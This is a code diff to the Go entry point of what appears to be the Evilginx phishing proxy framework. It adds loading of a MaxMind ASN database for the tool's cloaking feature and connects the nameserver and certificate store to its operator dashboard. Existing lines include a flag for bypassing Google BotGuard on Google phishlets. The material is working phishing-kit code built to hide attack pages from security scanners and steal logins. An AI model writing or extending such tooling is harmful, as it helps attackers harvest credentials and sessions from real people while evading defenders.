@@ -29,6 +29,7 @@ var dashboard_enabled = flag.Bool("dashboard", false, "Enable live dashboard web
 var dashboard_port = flag.Int("dashboard-port", 5050, "Dashboard web panel port")
 var dashboard_auth = flag.String("dashboard-auth", "", "Dashboard authentication token (auto-generated if empty)")
 var googleBypass = flag.Bool("google-bypass", false, "Enable Google BotGuard bypass for Google phishlets")
+var maxmind_db = flag.String("maxmind-db", "", "MaxMind GeoIP2-ASN database path (default: ~/.evilginx/GeoLite2-ASN.mmdb)")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -128,6 +129,28 @@ func main() {
 	}
 	cfg.SetRedirectorsDir(*redirectors_dir)
 
+	// Initialize MaxMind ASN database for cloaking (optional)
+	asnDBPath := *maxmind_db
+	if asnDBPath == "" {
+		usr, _ := user.Current()
+		if usr != nil {
+			asnDBPath = filepath.Join(usr.HomeDir, ".evilginx", "GeoLite2-ASN.mmdb")
+		} else {
+			asnDBPath = filepath.Join(*cfg_dir, "GeoLite2-ASN.mmdb")
+		}
+	}
+	if _, err := os.Stat(asnDBPath); err == nil {
+		asnLookup, err := core.NewMaxMindASNLookup(asnDBPath)
+		if err != nil {
+			log.Error("maxmind asn: failed to load database: %v", err)
+		} else {
+			core.GetCloak().SetASNDatabase(asnLookup)
+			log.Info("maxmind asn: loaded database from %s", asnDBPath)
+		}
+	} else {
+		log.Info("maxmind asn: database not found at %s, using fallback CIDR checks", asnDBPath)
+	}
+
 	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
 	if err != nil {
 		log.Fatal("database: %v", err)
@@ -205,6 +228,8 @@ func main() {
 			}
 		}
 		dash := dashboard.New(db, cfg, dashAuth, *dashboard_port)
+		dash.SetNameserver(ns)
+		dash.SetCertDb(crt_db)
 		go func() {
 			log.Info("dashboard: web panel starting on http://0.0.0.0:%d", *dashboard_port)
 			if dashAuth != "" {
